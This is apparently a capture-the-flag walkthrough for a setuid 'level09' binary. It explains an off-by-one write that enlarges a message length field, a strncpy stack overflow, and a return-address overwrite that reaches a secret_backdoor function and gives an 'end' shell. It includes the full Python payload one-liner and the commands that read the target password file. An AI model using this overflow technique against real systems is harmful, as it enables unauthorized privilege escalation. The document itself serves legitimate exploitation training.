# level09 Bonus

## Objective

Exploit the setuid `level09` message handler.

Reach `secret_backdoor`, obtain an `end` shell, and read
`/home/users/end/.pass`.

## Record layout

`handle_msg` allocates a 192-byte record on its stack:

```text
offset 0x00: message[140]
offset 0x8c: username[40]
offset 0xb4: message_length (initially 140)
```

The saved return address is 200 bytes (`0xc8`) from the start of this record.

## Length overwrite

`set_username` reads into a temporary buffer but copies through index 40 into
the 40-byte `username` member:

```c
for (index = 0; index <= 40 && input[index] != '\0'; index++)
    message->username[index] = input[index];
```

The 41st copied byte lands on the low byte of `message_length`. Send 40 filler
bytes followed by `0xd0`. This changes the length from `0x0000008c` to
`0x000000d0` (208).

`set_msg` then performs:

```c
strncpy(message->message, input, message->message_length);
```

The 208-byte copy reaches the saved return address at offset 200. This binary
has no stack canary.

## Backdoor address

The executable is PIE, but ASLR is disabled:

```sh
cat /proc/sys/kernel/randomize_va_space
```

```text
0
```

After `start` in GDB, the observed runtime backdoor address was:

```gdb
p/x (void *) secret_backdoor
$1 = 0x55555555488c
```

`secret_backdoor` reads one more line and runs it through `system`.

## Exploit

Run:

```sh
(python -c 'import sys,struct; sys.stdout.write("A"*40 + "\xd0\n" + "B"*200 + struct.pack("<Q", 0x55555555488c) + "\n/bin/sh\n")'; cat) | ./level09
```

The first line changes `message_length` to 208. The second line places
`secret_backdoor` at the saved return address. The third line becomes
`system("/bin/sh")`; the trailing `cat` keeps the shell interactive.

Verify the effective identity and read the final password:

```sh
id
cat /home/users/end/.pass
```

Observed identity:

```text
uid=1010(level09) gid=1010(level09) euid=1009(end) egid=100(users)
```

The end-user password is recorded in `flag`.